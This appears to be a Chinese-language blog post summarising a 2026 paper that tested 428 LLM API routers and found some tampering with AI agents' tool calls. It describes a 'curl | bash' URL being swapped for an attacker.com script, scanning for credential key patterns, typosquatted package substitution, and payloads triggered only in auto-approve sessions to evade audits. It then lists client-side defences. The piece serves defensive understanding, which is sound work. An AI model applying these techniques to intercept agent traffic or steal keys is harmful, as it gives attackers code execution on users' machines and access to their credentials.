---
title: "中转站的代价：实测 428 个 LLM API 路由器，9\n个在偷偷改你的代码"
date: 2026-04-10
source: https://yage.ai/share/llm-router-security-20260410.html
slug: llm-router-security-20260410
lang: zh
---
# 中转站的代价：实测 428 个 LLM API 路由器，9 个在偷偷改你的代码

发布于 2026 年 4 月 10 日 · [查看原网页](https://yage.ai/share/llm-router-security-20260410.html)

UCSB 昨天发了一篇论文，叫 “Your Agent Is Mine”（[arXiv:2604.08407](https://arxiv.org/abs/2604.08407)）。研究者买了
28 个付费的 LLM API 路由器——从淘宝、闲鱼和 Shopify
上买的——又从公开社区收集了 400
个免费路由器，然后系统性地测试它们会不会在返回的 tool call
里动手脚。

结果：9 个路由器在主动注入恶意代码。其中 1 个付费、8 个免费。17
个路由器碰了研究者放在请求里的 AWS 蜜罐凭证。1 个直接把研究者私钥里的
ETH 转走了。

不是理论推演，是实打实花钱买东西然后测出来的。

## 为什么这件事和你有关

如果你在用 Claude Code、Codex、Cursor 或者任何带 tool calling 能力的
AI agent，而这些 agent 的 API
请求经过了一个你不完全信任的中间层——中转站、代理、公司内部的 API
gateway——那这篇论文讨论的就是你。

Tool call 的工作原理是这样的：LLM 返回一段
JSON，告诉客户端”请执行这个命令”。客户端收到 JSON
后，在本地机器上执行。问题在于，从模型输出这段 JSON
到客户端收到它之间，中间经过的每一个路由器都能看到并修改它。没有任何密码学机制保证客户端收到的
JSON 和模型实际输出的一致性。

具体来说，如果你的 AI agent 要执行
`curl -sSL https://legitimate-tool.com/install.sh | bash`，中间的路由器可以把
URL 换成 `https://attacker.com/pwn.sh`。你的 agent
会毫不犹豫地执行这个被篡改的命令，因为 JSON
格式合法、工具名没变、参数结构没变。从 agent 的角度看，一切正常。

中间人攻击不需要破解
TLS，不需要伪造证书，因为你主动把中间人配置成了你的 API
endpoint。这就是整件事最讽刺的地方。

## 中转站是怎么变成攻击面的

LLM API
路由器本质上是一个应用层反向代理。它的工作是：收到你的请求，解析
JSON，转换格式（如果需要），转发给上游模型
provider，然后把响应返回给你。为了完成这个工作，它必须能读取你发送的一切内容——prompt、system
prompt、tool definitions、API key——和模型返回的一切内容——tool call
arguments、模型输出。

一个正常的路由器读完就转发了。一个恶意的路由器读完可以修改 tool call
参数、记录你的凭证、替换安装命令里的包名。两种行为的区别在流量层面完全不可见。

这个架构缺陷不是新发现的。2026 年 3 月 LiteLLM
通过依赖混淆被注入恶意代码的事件（[Trend
Micro 详细分析](https://www.trendmicro.com/en_us/research/26/c/inside-litellm-supply-chain-compromise.html)）已经证明了路由层是高价值攻击目标——LiteLLM 有超过 2.4
亿次 Docker Hub 下载，被攻破后所有使用它的部署都暴露了。Claude Code
自身就是发现那个恶意包的”人”（[r/ClaudeCode
讨论](https://www.reddit.com/r/ClaudeCode/comments/1s2c9ig/claude_code_discovered_a_malware_in_the_latest/)），一个 AI agent 发现了对 agent
基础设施的供应链攻击，这个细节本身就值得玩味。

但 LiteLLM
事件是正规军被黑。这篇论文测的是一个更隐蔽的问题：那些从第一天起就不怀好意的路由器。

在中国市场，这个问题的规模尤其大。由于直接访问 OpenAI/Anthropic API
的限制，一个庞大的 API 中转生态在淘宝、闲鱼和开源项目上长了出来。One
API（[GitHub 31.7k
stars](https://github.com/songquanpeng/one-api)）和它的 fork New API（[GitHub 26k
stars](https://github.com/QuantumNous/new-api)）是底层模板，数以千计的卖家基于这些模板部署中转服务然后出售
API 额度。论文引用的调查报道显示淘宝上有卖家积累了超过 3
万次重复购买。这些卖家的身份匿名、运营不受监管、出了问题你找不到任何人负责。

## 四种攻击方式

论文定义了清晰的攻击分类法。两种核心攻击，两种规避变体。

**载荷注入（AC-1）**是最直接的。路由器收到模型返回的
tool call，修改其中的参数，然后把修改后的版本发给客户端。上面
`curl | bash` URL
替换就是典型例子。一次修改就足以在客户端机器上实现任意代码执行。

**凭证窃取（AC-2）**更隐蔽。路由器什么都不改，只是被动扫描经过的明文流量中的密钥模式——OpenAI
key（`sk-...`）、AWS key（`AKIA...`）、GitHub
PAT（`ghp_...`）、以太坊私钥（`0x...`）、PEM
证书——然后异步外泄。因为路由器本来就需要读取这些数据来完成转发，所以这种行为在流量层面完全不可见。

**依赖注入（AC-1.a）**是载荷注入的精巧变体。不是替换
URL（可以被域名白名单拦住），而是替换安装命令中的包名。比如
`pip install requests` 变成
`pip install reqeusts`——一个在 PyPI
上预注册的恶意包，只有一个字母的差异。改写后的命令从同一个可信仓库安装，域名白名单拦不住。而且一旦恶意包安装成功，它在本地缓存中持续存在，即使你之后不再使用那个恶意路由器，后门也已经种下了。

**条件交付（AC-1.b）**是最让人不安的。路由器平时完全正常，只在特定条件下才注入恶意载荷。论文在实测中发现的触发条件包括：等
50 次调用后才激活（规避短期审计），只在检测到 YOLO 模式的 session
中注入（工具执行自动批准，不需要人工确认），只针对特定编程语言的项目（Rust、Go）。这意味着你即使测试了一个路由器
10 次、20 次、30
次都完全正常，也不能证明它是安全的。有限次的黑盒审计对条件交付从根本上是不够的。

## 看起来正常的中转站也不安全

428
个路由器的测试结果只是论文的一部分。更有意思的是两个投毒实验，它们回答了一个更根本的问题：看起来正常的中转站，真的安全吗？

第一个实验：研究者故意在中文论坛和微信/Telegram
群里泄露了一个自己控制的 OpenAI key。这单个 key 被用来生成了 1 亿个
GPT-5.4 token，并触发了 7 个以上的 Codex
session。一个正常运作的路由器拿到一个泄露的 key
后，会在它的用户之间共享这个
key。而所有经过这个路由器的流量——prompt、tool
call、凭证——对路由器运营者来说都是明文可见的。

第二个实验：研究者部署了 20 个弱配置的 decoy 路由器。这些 decoy
收到了来自 147 个 IP 的数万次未授权访问，处理了 20 亿个 token，暴露了约
13GB 的下游流量。在这些流量中，研究者发现了 99 个凭证跨 440 个 Codex
session 泄露，涉及 398 个不同的项目或主机。440 个 session 中有 401
个已经在 YOLO
模式下运行。也就是说，工具执行是自动批准的，攻击者甚至不需要条件交付这种高级技巧，最简单的载荷注入就够了。

这两个实验说明的问题比 9/428 这个数字更严重。9/428
测量的是从一开始就恶意的路由器比例。投毒实验测量的是正常路由器因为使用泄露
key
或转发到弱配置节点而被拉入攻击面的概率。后者的影响面远大于前者，因为它意味着即使你选择了一个看起来正常的中转站，如果它使用的上游
key 是泄露的、或者它转发到的下一跳是恶意的，你一样暴露。

## 能做什么

论文评估了三种可以在今天部署的客户端防御。

Fail-closed
策略网关对高风险工具（Bash、shell\_command）的参数执行确定性检查，以 1%
的误报率阻止了所有载荷注入和依赖注入样本。但如果攻击者使用白名单域名或预部署的本地
payload，这个网关在 100% 的情况下可以被绕过。

响应侧异常检测通过分析 tool\_call 参数的统计特征来标记可疑修改，能标记
89% 的载荷注入样本，误报率 6.7%，对防御意识强的攻击者效果显著下降。

追加式透明日志不防止攻击，但记录每个 tool\_call
的完整内容用于事后取证，存储成本约 1.26KB/条目。

这三种方案都只能减缓，不能根治。根本原因在于客户端无法证明路由器保留了上游
provider 的原始响应。论文作者认为长期解决方案是 provider
端提供密码学签名的 response envelope——类似于电子邮件的 DKIM
签名，让客户端能验证收到的 tool call JSON 确实来自上游模型。目前没有任何
provider 实现了这一机制。

## 几个具体的建议

直接调用 provider 的 API。OpenAI、Anthropic、Google 都有官方
SDK，配置一次就行。如果因为网络或成本原因必须使用路由器，选择有明确公司实体、有隐私政策、有安全文档的品牌服务（比如
OpenRouter、ZenMux），而不是淘宝或 Telegram
上的匿名卖家。品牌服务的便宜来自规模采购和运营效率，匿名卖家的便宜只能来自你不了解的成本削减。

关闭 agent 的 YOLO 模式和自动工具批准。论文的数据显示 401/440
个暴露的 session 在 YOLO
模式下运行。自动批准等于把执行权无条件交出去，而中间层正好需要的就是这个执行权。

对你使用的 AI coding 工具启用沙箱。Claude Code 支持 [OS
级沙箱](https://www.anthropic.com/engineering/claude-code-sandboxing)（Linux 上用 bubblewrap，macOS 上用 Seatbelt），Codex
支持沙箱虚拟机。沙箱不能防止 tool call
被篡改，但能限制被篡改后的命令造成的破坏范围。

把你放在 AI 工具可访问路径上的密钥全部迁移到 secrets manager。AI
coding 工具的 session log 会记录它读到的所有文件内容，包括
`.zshrc`、`.npmrc`、`.env`
里的凭证。如果这些凭证被中间层截获，后果远超 API
账单——它是系统边界探测，是分发通道的劫持，是整个凭据体系的沦陷。

## 判断

这篇论文投到了 ACM CCS 2026（[CyberSecurityNews
报道](https://cybersecuritynews.com/ai-router-vulnerabilities/)），作者团队来自 UCSB、UCSD、Fuzzland 和 World Liberty
Financial。它的价值不在于揭示了某个未知漏洞，而在于第一次用实测数据量化了一个很多人觉得可能有问题但说不出具体有多大的风险。

读这个数字时需要注意两个方法论局限。第一，428
个路由器全部来自公开的灰色市场——淘宝、闲鱼、Shopify
上的付费卖家，以及公开社区收集的免费路由器。这是”最可能有问题的人群”的便利样本，不是整个路由器生态系统的代表性抽样。9/428
的恶意率说明灰色市场有风险，但不能直接推广到企业级部署或品牌路由服务。付费子样本只有
28 个（其中 1 个恶意），统计上完全不稳定。第二，“17
个路由器碰了蜜罐凭证”的定义是：凭证经过路由器后产生了可归因的 AWS API
活动。这不等于路由器运营者主动窃取了凭证——多跳路由链中，任何一跳都可能是泄露点，自动化的凭证扫描器或被污染的下游基础设施也可能触发同样的信号。ETH
转走的事件证明了密钥被滥用，但在多跳链路中同样无法高置信度归因到被测的那个路由器。论文自己也承认了有限黑盒探测和无法覆盖所有潜在触发条件的限制。

投毒实验部分则提供了不同角度的证据：即使你选择了一个看起来正常的中转站，如果它使用的上游
key
是泄露的、或者它转发到的下一跳是恶意的，你一样暴露。从这个角度看，恶意和正常之间的界限比
9/428 这个数字暗示的更模糊。

核心问题是一个架构层面的完整性缺失：当前所有主流 LLM provider
都没有对 tool call
响应提供端到端的密码学签名。只要这个缺失存在，任何经过中间层的 agent
调用都可以被静默篡改，而客户端侧的检测总可以被更聪明的攻击者绕过。在
provider 侧实现 response integrity
之前，最实际的做法是减少中间层数量、对每一层保持可验证性、并假设任何你无法审计的中间层都在读取你的所有流量。

## 相关阅读

- [Vibe
  Coding 的安全危机](https://yage.ai/share/vibe-coding-security-crisis-20260517.html) — 路由器攻击是更广泛的 AI
  编程安全危机的一个截面：Vibe Coding 带来的系统性供应链风险
- [你的
  Evaluator 在保护谁：Agent 监控架构的隐藏盲点](https://yage.ai/share/peer-preservation-evaluator-assumption-20260404.html) — 在传输层之后，Agent
  监控架构本身同样存在被绕过的盲点
- [AI
  编程工具的配置文件，现在是攻击入口](https://yage.ai/share/ai-coding-config-injection-20260422.html) —
  路由器注入之外的另一个攻击面：配置文件作为 AI 工具链的供应链薄弱点

## 鸭哥每日手记

日更的深度AI新闻和分析

订阅

[Built with Kit](https://kit.com/features/forms?utm_campaign=poweredby&utm_content=form&utm_medium=referral&utm_source=dynamic)

本文 100% 由 AI 生成
·
Superlinear Academy

[3,000+ AI Builder 在这里交流实战经验 · 加入社区
→](https://go.ai-builders.com/yage)
